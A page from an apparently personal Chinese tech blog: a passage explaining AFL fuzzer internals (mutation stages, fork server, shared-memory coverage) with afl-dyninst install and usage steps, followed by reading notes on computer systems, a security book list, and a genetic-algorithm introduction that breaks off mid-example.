<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">   总的来讲，AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下：</span><br><span class="line">1.bitflip，按位翻转，1变为0，0变为1</span><br><span class="line">2.arithmetic，整数加/减算术运算</span><br><span class="line">3.interest，把一些特殊内容替换到原文件中</span><br><span class="line">4.dictionary，把自动生成或用户提供的token替换/插入到原文件中</span><br><span class="line">5.havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异，</span><br><span class="line">6.splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</span><br><span class="line">其中，前四项bitflip, arithmetic, interest, dictionary由于其变异方式没有随机性，所以也称为deterministic fuzzing；而havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。</span><br><span class="line"></span><br><span class="line">bitflip变异：</span><br><span class="line">拿到一个原始文件，首先的变异类型就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为：</span><br><span class="line">bitflip 1/1，每次翻转1个bit，按照每1个bit的步长从头开始</span><br><span class="line">bitflip 2/1，每次翻转相邻的2个bit，按照每1个bit的步长从头开始</span><br><span class="line">bitflip 4/1，每次翻转相邻的4个bit，按照每1个bit的步长从头开始</span><br><span class="line">bitflip 8/8，每次翻转相邻的8个bit，按照每8个bit的步长从头开始，即依次对每个byte做翻转</span><br><span class="line">effector map的生成：完成bitflip 8/8的同时，还生成了effector map，该作用是对byte进行标记，在对每个byte进行翻转变异时，其新的执行路径与原来的路径不一致时，就对该byte标记为1，表示即为有效的，否则标记为0；这样做的优点是如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。</span><br><span class="line">bitflip 16/8，每次翻转相邻的16个bit，按照每8个bit的步长从头开始，即依次对每个word做翻转</span><br><span class="line">bitflip 32/8，每次翻转相邻的32个bit，按照每8个bit的步长从头开始，即依次对每个dword做翻转</span><br><span class="line"></span><br><span class="line">arithmetic变异：</span><br><span class="line">arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异</span><br><span class="line">arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异</span><br><span class="line">arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异</span><br><span class="line">加减运算的相关设置在config.h定义，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。此外，AFL会智能的跳过某些arithmetic,第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。</span><br><span class="line"></span><br><span class="line">interest变异：</span><br><span class="line">interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换</span><br><span class="line">interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换</span><br><span class="line">interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换</span><br><span class="line">其中interest value的值在config.h已经设定好</span><br><span class="line">#define INTERESTING_8 \</span><br><span class="line">  -128,          /* Overflow signed 8-bit when decremented  */ \</span><br><span class="line">  -1,            /*                                         */ \</span><br><span class="line">   0,            /*                                         */ \</span><br><span class="line">   1,            /*                                         */ \</span><br><span class="line">   16,           /* One-off with common buffer size         */ \</span><br><span class="line">   32,           /* One-off with common buffer size         */ \</span><br><span class="line">   64,           /* One-off with common buffer size         */ \</span><br><span class="line">   100,          /* One-off with common buffer size         */ \</span><br><span class="line">   127           /* Overflow signed 8-bit when incremented  */</span><br><span class="line">可以看到，用于替换的基本都是可能会造成溢出的数;与之前相同，effector map仍然会用于判断是否需要变异；</span><br><span class="line"></span><br><span class="line">dictionary变异：</span><br><span class="line">user extras (over)，从头开始，将用户提供的tokens依次替换到原文件中</span><br><span class="line">user extras (insert)，从头开始，将用户提供的tokens依次插入到原文件中</span><br><span class="line">auto extras (over)，从头开始，将自动检测的tokens依次替换到原文件中</span><br><span class="line">tokens:在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。</span><br><span class="line"></span><br><span class="line">havoc变异：</span><br><span class="line">随机选取某个bit进行翻转</span><br><span class="line">随机选取某个byte，将其设置为随机的interesting value</span><br><span class="line">随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</span><br><span class="line">随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</span><br><span class="line">随机选取某个byte，对其减去一个随机数</span><br><span class="line">随机选取某个byte，对其加上一个随机数</span><br><span class="line">随机选取某个word，并随机选取大、小端序，对其减去一个随机数</span><br><span class="line">随机选取某个word，并随机选取大、小端序，对其加上一个随机数</span><br><span class="line">随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</span><br><span class="line">随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</span><br><span class="line">随机选取某个byte，将其设置为随机数</span><br><span class="line">随机删除一段bytes</span><br><span class="line">随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</span><br><span class="line">随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</span><br><span class="line">随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</span><br><span class="line">随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</span><br></pre></td></tr></table></figure>
<p><strong><code>Fuzzer dictionaries</code></strong> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">刚开始我们或许都有个疑惑，afl的最显眼的局限之一是如何解决的，afl的变异引擎是语法盲，并针对紧凑数据格式（即，图像，多媒体，压缩数据，正则表达式语法或shell脚本）进行了优化，但是它不太适合特别冗长，冗余并且带有语法的的语言 - 尤其包括HTML，SQL或JavaScript。</span><br><span class="line">为了避免构建语法感知工具的麻烦，afl-fuzz提供了一种使用语言关键字，magic header或其他与目标数据类型相关联的特殊表示的可选字典为模糊过程提供种子的方法 - 并且使用它来重建底层语法</span><br></pre></td></tr></table></figure>
<p><strong><code>forkserver</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编译 target 完成后，就可以通过 afl-fuzz 开始 fuzzing了。其大致思路是，对输入的 seed 文件不断地变化，并将这些 mutated input 喂给 target 执行，检查是否会造成崩溃。因此，fuzzing 涉及到大量的 fork 和执行 target 的过程。 为了更高效地进行上述过程，AFL 实现了一套 fork server 机制。其基本思路是：启动 target 进程后，target 会运行一个 fork server；fuzzer 并不负责 fork 子进程，而是与这个 fork server 通信，并由 fork server 来完成fork 及继续执行目标的操作。这样设计的最大好处，就是不需要调用execve()，从而节省了载入目标文件和库、解析符号地址等重复性工作。 接下来，我们来看看 fork server 的具体运行原理。</span><br></pre></td></tr></table></figure>
<p><img src="/2018/10/07/AFL漫谈/forkserver.PNG" alt=""></p>
<p><strong><code>内存共享</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    作为fuzzer，AFL并不是毫无目的对输入文件无脑地随机变化（其实也支持这种方式，即dumb模式），它会对target进行插桩，以辅助mutated input的生成。具体地，插桩后的target，会记录执行过程中的分支信息；随后，fuzzer便可以根据这些信息，判断这次执行的整体流程和代码覆盖情况。 </span><br><span class="line">AFL使用共享内存，来完成以上信息在fuzzer和target之间的传递。</span><br><span class="line"></span><br><span class="line">1.fuzzer在启动时，会执行setup_shm()方法进行配置。其首先调用shemget()分配一块共享内存，大小MAP_SIZE为64K:</span><br><span class="line">shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600);</span><br><span class="line">2.分配成功后，该共享内存的标志符会被设置到环境变量中，从而之后fork()得到的子进程可以通过该环境变量，得到这块共享内存的标志符：</span><br><span class="line">shm_str = alloc_printf(&quot;%d&quot;, shm_id);</span><br><span class="line">if (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, 1);</span><br><span class="line">并且，fuzzer本身，会使用变量trace_bits来保存共享内存的地址：</span><br><span class="line">trace_bits = shmat(shm_id, NULL, 0);</span><br><span class="line">3.在每次target执行之前，fuzzer首先将该共享内容清零：</span><br><span class="line">memset(trace_bits, 0, MAP_SIZE); </span><br><span class="line">4.target获取并使用这块共享内存的。相关代码同样也在上面提到的方法__afl_maybe_log()中。首先，会检查是否已经将共享内存映射完成：__afl_area_ptr中保存的就是共享内存映射到target的内存空间中的地址，如果其不是NULL，便保存在ebx中继续执行；否则进一步跳转到__afl_setup。__afl_setup处会做一些错误检查，然后获取环境变量AFL_SHM_ENV的内容并将其转为整型。查看其定义便可知，这里获取到的，便是之前fuzzer保存的共享内存的标志符。</span><br><span class="line">5.最后，通过调用shmat()，target将这块共享内存也映射到了自己的内存空间中，并将其地址保存在__afl_area_ptr及edx中。由此，便完成了fuzzer与target之间共享内存的设置。</span><br><span class="line"></span><br><span class="line">注记：如果使用了fork server模式，那么上述获取共享内存的操作，是在fork server中进行；随后fork出来的子进程，只需直接使用这个共享内存即可。</span><br></pre></td></tr></table></figure>
<p><strong>四，使用afl-dyninst fuzz无源码的二进制程序</strong></p>
<p>通常来讲，afl-fuzz需要对待fuzz程序重编译，重而对其进行插桩,这就要求拥有待fuzz程序的完整源代码。而afl-dyninst提供了一种静态无源码插桩的手段使得可以对无源码二进制程序插桩。</p>
<p>下载编译首先需要安装以下软件:sudo apt-get </p>
<p><strong><code>下载&amp;&amp;编译</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libelf-dev libelf1 libiberty-dev libboost-all-dev</span><br></pre></td></tr></table></figure>
<p><code>afl-dyninst是基于dyninst的,所以需要下载&amp;&amp;编译&amp;&amp;安装dyninst:</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dyninst/dyninst.git</span><br><span class="line">cd dyninst</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DBOOST_LIBRARYDIR=/usr/lib/x86_64-linux-gnu</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p><code>下载&amp;&amp;编译afl-dyninst</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/talos-vulndev/afl-dyninst.git</span><br><span class="line">cd afl-dyninst</span><br><span class="line">make</span><br><span class="line">sudo cp afl-dyninst /usr/bin/</span><br><span class="line">sudo cp libAflDyninst.so /usr/local/lib/</span><br><span class="line">echo &quot;/usr/local/lib&quot; &gt; /etc/ld.so.conf.d/dyninst.conf &amp;&amp; ldconfig</span><br><span class="line">echo &quot;export DYNINSTAPI_RT_LIB=/usr/local/lib/libdyninstAPI_RT.so&quot; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
<p><strong><code>使用</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Usage: ./afl-dyninst -i &lt;binary&gt; -o &lt;binary&gt; -l &lt;library&gt; -e &lt;address&gt; -s &lt;number&gt;</span><br><span class="line">             -i: Input binary </span><br><span class="line">             -o: Output binary</span><br><span class="line">             -l: Library to instrument (repeat for more than one)</span><br><span class="line">             -e: Entry point address to patch (required for stripped binaries)</span><br><span class="line">             -r: Runtime library to instrument (path to, repeat for more than one)</span><br><span class="line">             -s: Number of basic blocks to skip</span><br><span class="line">             -v: Verbose output</span><br><span class="line">example:</span><br><span class="line">afl-dyninst -i testbin -o testbin_ins</span><br><span class="line">to fuzz:</span><br><span class="line">export AFL_SKIP_BIN_CHECK=1</span><br><span class="line">afl-fuzz -i in -o out testbin_ins</span><br></pre></td></tr></table></figure>
<p><strong>五，AFL的优化改进方向</strong></p>
<p>​        这几天通过对源码的阅读学习，领略了该神级工具的设计巧妙与功能强大之处，当然在实现的过程中，也存在些许不足，会想尝试能不能自己去做一个优化或者改进，让他能具有一定的针对性或者更强的fuzz能力，参考了各位大牛的paper，结合afl的不足，总结下优化改进的一些点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.coverage的碰撞问题</span><br><span class="line">   AFL要用到一个64KB bitmap来保存Coverage的信息，在这个过程，它是通过给边算出来hash值，用hash代表边来更新bitmap,而在hash算法中则存在碰撞问题，它而影响这个Fuzzer的判断，这个Fuzzer会根据bitmap来判断当前这个种子是不是好的优秀的种子，判断这个种子是不是走了新的边，如果碰撞了，它是看不出来这是新的边。如果新的边出现了，它的哈希值与前哈希值是一样的，那么Fuzzer认为这个边是测过的边，认为这个种子没用，进而扔掉了实际很好的种子。甚至会漏掉一些crash.</span><br><span class="line">2.变异阶段的随机性问题</span><br><span class="line">    变异的类型可分为bitflip，arithmetic，interest，dictionary，havoc，splice六种，而在这六种类型中后面俩种havoc和splice都是没有针对性的，存在一定的随机性，而这些部分也就成了不折不扣的“看天吃饭”，所以，可以在变异策略上优化减少这种随机性，尽量去变异那些更重要的字符。</span><br><span class="line">3.改进种子的选择策略</span><br><span class="line">    可以改进优先选择对Coverage有贡献的种子</span><br></pre></td></tr></table></figure>
<p><strong>六，参考文献</strong></p>
<p>【1】<a href="https://rk700.github.io/2018/01/04/afl-mutations/" target="_blank" rel="noopener">https://rk700.github.io/2018/01/04/afl-mutations/</a></p>
<p>【2】<a href="http://chao.100871.net/papers/oakland18.pdf" target="_blank" rel="noopener">http://chao.100871.net/papers/oakland18.pdf</a></p>
<p>【3】<a href="https://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html" target="_blank" rel="noopener">https://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html</a></p>
<p>【4】<a href="https://blog.csdn.net/Chen_zju/article/details/80791268" target="_blank" rel="noopener">https://blog.csdn.net/Chen_zju/article/details/80791268</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/fuzz-tools/">fuzz tools</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/09/28/读书笔记/"><span>读书笔记</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/09/28/读书笔记/" rel="bookmark">
        <time class="entry-date published" datetime="2018-09-28T15:17:36.000Z">
          2018-09-28
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>读《程序员的自我修养》记录</p>
<p>三个关键部位 ：中央处理器CPU  内存和I/O控制芯片</p>
<p>为了能够让CPU能够和I/O设备进行通信，每个设备都会有一个I/O控制器</p>
<p>南桥/北桥：由于北桥运行的速度非常高，所有相对低速的设备如果全都直接连接在北桥上，北桥既须处理高速设备，又须处理低速设备，设计就会十分复杂，于是人们又设计了专门处理低速设备的南桥芯片，磁盘，USB，键盘，鼠标等设备都连接在南桥上，由南桥将他们汇总后链接在北桥上。</p>
<p>对称多处理器（SMP）:(多个CPU)，每个CPU在系统中所处的地位和发挥的功能都是一样的，是相互对称的。理论上讲，增加CPU的数量就可以提高运算速度，并且理想情况下，速度的提高与CPU的数量成正比。但实际并非如此，因为我们的程序并不都能分解成若干的完全不相干的子问题，就比如一个女生可以花10个月生出一个孩子，但是十个女生并不能在一个月就生出一个孩子一样。</p>
<p>多核处理器：多个处理器共享一个缓存部件，其实为简化版SMP</p>
<p>‘’计算机科学领域的任何问题都可以通过增加一个间接的中间层来解决。’’</p>
<p>计算机软件体系结构（图）</p>
<p>接口：满足每个层次之间的相互通信的通信的协议</p>
<p>虚拟机技术：在硬件与操作系统之间增加了一层虚拟层，使得一个计算机上可以同时运行多个操作系统。</p>
<p>系统调用接口在实现中往往以软件中断的方式提供，eg:Linux使用0x80号中断作为系统调用接口；windows使用0x2E号中断作为系统调用接口（Windows XP Sp2开始，windows开始采用一种新的系统调用方式）。</p>
<p>分时系统：每个程序运行一段时间以后都主动让出CPU给其他程序，使得一段时间内每个程序都有机会运行一小段时间。</p>
<p>多任务系统：操作系统接管了所有的硬件资源，并且本身运行在一个受硬件保护的级别。所有的应用程序都以进程的方式运行在比操作系统权限更低的级别，每个进程都有自己独立的地址空间，是得进程之间的地址空间相互隔离。</p>
<p>抢占式：操作系统可以强制剥夺CPU资源并且分配给它认为目前最需要的进程。</p>
<p>磁盘寻址：</p>
<p>如何找到我们想要的数据呢？即如何在硬盘上找到任意一个物理地址。</p>
<p>1）CHS模式（Cylinder/Head/Sector）  就是给定柱面号、磁头号、扇区号。柱面号给定在哪一个圆环上，磁头号指定了在哪一层，扇区号指定了圆上的位置，于是就定位到了一个准确的扇区了。  2）LBA（Logical Block Addressing，逻辑块寻址）  就是只给一个逻辑号码，根据硬盘的柱面数、每个柱面的磁头数、每个磁道的扇区数来计算柱面号、磁头号、扇区号。  编号方法：  按照柱面、磁头、扇区顺序来编，即编完0号柱面0号磁头所在磁道的若干扇区后，再编0号柱面1号磁头所在磁道的所以扇区，编完0号柱面的所有磁头后再编1号柱面。   </p>
<p>3）相互转换  LBA = （柱面号 <em> 一个柱面的磁头数 + 磁头号） </em> 一个磁道上的扇区数 + （扇区号-1）   柱面号 = LBA / （一个柱面的磁头数 <em> 每个磁道扇区数）  令   x = LBA % （一个柱面的磁头数 </em> 每个磁道扇区数）  磁头号 = x / 每个磁道上的扇区数  扇区号 = x % 每个磁道上的扇区数 + 1 </p>
<p><a href="https://blog.csdn.net/guzhou_diaoke/article/details/8479033" target="_blank" rel="noopener">https://blog.csdn.net/guzhou_diaoke/article/details/8479033</a></p>
<p>2018.10.2</p>
<p>内存使用效率：</p>
<p>分页：程序在一段时间段内都是不会被用到的，用更小粒度的内存分割和映射的方法，使得程序的局部性原理得到充分的利用，大大提高了内存的使用率，这种方法就是分页。</p>
<p>线程：（或称）轻量级进程，是程序执行流的最小单元，标准线程=线程ID+当前指令指针pc+寄存器集合+堆栈</p>
<p>通常一个进程=多个线程</p>
<p>​      线程的访问非常的自由，它可以访问进程内存里的所有数据，甚至包括其他进程的堆栈（如果他知道其他进程的堆栈地址，那么这种就是很少见的情况）但实际运用中线程也拥有自己的私有存储空间，包括以下几个方面：</p>
<ul>
<li>栈：（尽管并非完全无法被其他线程访问，一般情况下仍然可以认为是私有的数据）</li>
<li>线程局部存储（TLS）:是某些操作系统为线程单独提供的私有空间，但通常只是有限的容量</li>
<li>寄存器（包括pc寄存器）：寄存器是执行流的基本数据，因此为线程私有。</li>
</ul>
<p>IO密集型线程：频繁等待的线程；</p>
<p>CPU密集线程：很少等待的线程；</p>
<p>IO密集型线程总比CPU型密集型线程容易得到优先级的提升；</p>
<p>线程优先级改变一般有三种方式：</p>
<ul>
<li>用户指定优先级</li>
<li>根据进入等待状态的频繁程度提升或降低优先级</li>
<li>长时间得不到执行而被提升优先级</li>
</ul>
<p>写时复制：指的是两个任务可以同时自由的读取内存，但任意一个任务试图对内存进行修改时，内存就会复制一份提供给修改方单独使用，以免影响到其他的任务使用。</p>
<p>fork与exec通常用于产生新任务，而如果要产生新线程，则可以使用clone</p>
<p>原子操作：windows里有一套API,专门进行一些原子操作（interlocked API）</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/books/">books</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/09/26/定个任务书单吧/"><span>定个booklist任务吧</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/09/26/定个任务书单吧/" rel="bookmark">
        <time class="entry-date published" datetime="2018-09-26T15:52:59.000Z">
          2018-09-26
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="BookList："><a href="#BookList：" class="headerlink" title="BookList："></a>BookList：</h2><p>一号之前吧，给自己列一个书籍清单！监督自己赶年前（标*的）完成这些。。。。</p>
<p>二进制：</p>
<p>《深入理解Linux内核》*</p>
<p>《Linux内核设计与实现》*</p>
<p>《Linux内核源代码情景分析》*</p>
<p>《windows内核情景分析》*</p>
<p>《windows内核原理与实现》*</p>
<p>《寒江独钓:windows内核安全编程》*</p>
<p>《模糊测试-强制性安全漏洞发掘》*</p>
<p>技巧类</p>
<p>《黑客攻防技术宝典-系统实战篇》 人民邮电出版社</p>
<p>《reverse C++》</p>
<p>《c++反汇编与逆向分析技术揭秘》</p>
<p>《格蠢汇编：软件调试案例》</p>
<p>《黑客攻防技术宝典-系统实战篇》 人民邮电出版社</p>
<p>《0day安全：软件漏洞分析技术》 电子工业出版社</p>
<p>《漏洞战争-软件漏洞分析精要》 电子工业出版社</p>
<p>《逆向工程核心原理》人民邮电出版社</p>
<p>《加密与解密》</p>
<p>《IDA Pro权威指南》</p>
<p>《reverse engineering for beginners》</p>
<p>编程：</p>
<p>《Python灰帽子-黑客与逆向工程的python编程之道》*</p>
<p>《Python自动化运维：技术与最佳实践》</p>
<p>《精通黑客脚本》</p>
<p>《window核心编程》*</p>
<p>扩展：</p>
<p>《游戏外挂开放艺术》</p>
<p>《捉虫日记》</p>
<p>《黑客免杀》</p>
<p>《恶意代码分析》</p>
<p>《安全软件开发之道》</p>
<p>《模糊测试-强制性安全漏洞发掘》</p>
<p>《灰帽黑客：正义黑客的道德规范、渗透测试、攻击方法和漏洞分析技术》</p>
<p>出来混，迟早是要还的。。。</p>
<p>欠的书，迟早是要读的。。。</p>
<h4 id="附：BookList"><a href="#附：BookList" class="headerlink" title="附：BookList"></a>附：BookList</h4><p><a href="https://github.com/DerekLoveCC/BookList#%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8" target="_blank" rel="noopener">https://github.com/DerekLoveCC/BookList#%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8</a></p>
<h4 id="一系列编程算法书单"><a href="#一系列编程算法书单" class="headerlink" title="一系列编程算法书单"></a>一系列编程算法书单</h4><p><a href="https://github.com/HongYiMU/TheAlgorithm" target="_blank" rel="noopener">https://github.com/HongYiMU/TheAlgorithm</a></p>
<p><a href="https://github.com/knownsec/RD_Checklist/blob/master/special/index.rst" target="_blank" rel="noopener">https://github.com/knownsec/RD_Checklist/blob/master/special/index.rst</a></p>
<h4 id="一系列用于Fuzzing学习的资源汇总"><a href="#一系列用于Fuzzing学习的资源汇总" class="headerlink" title="一系列用于Fuzzing学习的资源汇总"></a>一系列用于Fuzzing学习的资源汇总</h4><p><a href="http://www.freebuf.com/articles/rookie/169413.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/rookie/169413.html</a></p>
<p><a href="https://github.com/secfigo/Awesome-Fuzzing" target="_blank" rel="noopener">https://github.com/secfigo/Awesome-Fuzzing</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/书籍/">书籍</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/09/23/关于遗传算法/"><span>关于遗传算法</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/09/23/关于遗传算法/" rel="bookmark">
        <time class="entry-date published" datetime="2018-09-23T10:42:56.000Z">
          2018-09-23
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p><strong>遗传算法</strong></p>
<p>因为在之前就有了解过该算法，并且该算法在好多工具都有体现，所以也刚好有个机会，去整理整理相关的资料，以后也会不断的去充实的！</p>
<p><strong>1.遗传算法定义</strong><br>       首先，我们先讲个例子。例如，在一群小狗里面挑选优秀的警犬种子。<br>    （1）设定好小狗的初始群大小；<br>    （2）定义一个函数来区分优秀犬类和普通犬类；<br>    （3）我们选择出优秀犬类，并让他们繁殖自己的后代；<br>    （4）最后，这些后代替代原来狗群中的普通类，不断地充实优秀犬类的占比，并且最后不断的重复该过程。</p>
<p>遗传算法的工作过程其实也是这样的，在某种程度上模拟进化的过程，所以我们可以由此得出该算法的定义；</p>
<p>遗传算法（Genetic Algorithm）是一类借鉴生物界的进化规律（适者生存，优胜劣汰遗传机制）演化而来的随机化搜索方法；</p>
<p><strong>2.遗传算法的实现细节</strong></p>
<p>总体的实现过程如图：</p>
<p><img src="/2018/09/23/关于遗传算法/main.PNG" alt="总体的流程图"></p>
<p>首先，算法随机生成一定数量的个体，有时候操作者也可以干预这个随机产生过程，以提高初始种群的质量。在每一代中，都会评价每一个体，并通过计算适应度函数得到适应度数值。按照适应度排序种群个体，适应度高的在前面。这里的“高”是相对于初始的种群的低适应度而言。 </p>
<p>下一步则是产生下一代个体并且组成种群，而这个过程则是通过选择和繁殖来完成的，即Crossover交叉操作和Mutation变异。然后再进行根据新个体的适应度进行，但同时不意味着完全以适应度高低为导向，因为单纯选择适应度高的个体将可能导致算法快速收敛到局部最优解而非全局最优解，我们称之为早熟。作为折中，遗传算法依据原则：适应度越高，被选择的机会越高，而适应度低的，被选择的机会就低。初始的数据可以通过这样的选择过程来不断进行来组成一个相对优化的群体。 </p>
<p>在该过程中具体的实现细节，我们以背包问题为例：比如，你准备要去野游 1 个月，但是你只能背一个限重 30 公斤的背包。现在你有不同的必需物品，它们每一个都有自己的「生存点数」（具体在下表中已给出）。因此，你的目标是在有限的背包重量下，最大化你的「生存点数」。 </p>
<p><img src="/2018/09/23/关于遗传算法/bagg.jpg" alt="背包问题"></p>
<p>2.1初始化</p>
<p>如上流程所述，我们首先来初始化定义总体，总体包含各个个体，而每个个体都有一套属于自己的染色体。</p>
<p>染色体可表达为 2 进制数串，在这个问题中，1 代表接下来位置的基因存在，0 意味着丢失。（特定位置上的基因代表了上方背包问题表格中的物品，比如第一个位置上是 Sleeping Bag，那么此时反映在染色体的『基因』位置就是该染色体的第一个『基因』。） </p>
<p><img src="/2018/09/23/关于遗传算法/gene.jpg" alt=""></p>
<p>如上图，我们将图中的 4 条染色体看作我们的总体初始值。</p>
<p>2.2适应度函数</p>
<p>接下来，我们计算前两条染色体的适应度分数。对于 A1 染色体 [100110] 而言， 则有</p>
<p><img src="/2018/09/23/关于遗传算法/2.2.jpg" alt=""></p>
<p>类似的，则对于A2 染色体 [001110] 来说 ：</p>
